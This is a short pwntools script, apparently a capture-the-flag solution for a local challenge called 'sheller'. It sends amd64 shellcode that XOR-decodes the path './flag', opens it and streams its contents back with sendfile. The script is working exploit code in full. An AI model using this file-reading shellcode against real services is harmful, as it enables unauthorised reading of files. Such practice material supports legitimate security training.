from pwn import *

context.arch = "amd64"
context.terminal = ["terminator", "-e"]

p = remote("localhost", 1024)
#p = process("./docker/sheller")
#gdb.attach(p, '''
#b *main+119
#c
#''')
input("wait")
payload = asm('''
mov rax, 0x0101010101010101
push rax
mov rax, 0x010166606d672e2f
xor [rsp], rax

mov rdi, rsp
xor rax, rax
mov al, 2
xor rdx, rdx
xor rsi, rsi
syscall


mov r10, rax
xor rax, rax
mov al, 40
mov rsi, r10
xor rdi, rdi
inc rdi
xor rdx, rdx
mov r10d, 0xffffffff
syscall 
''')
log.info("Sending payload")
p.send(payload)
with open("exploit", "wb") as f:
    f.write(payload)
p.interactive()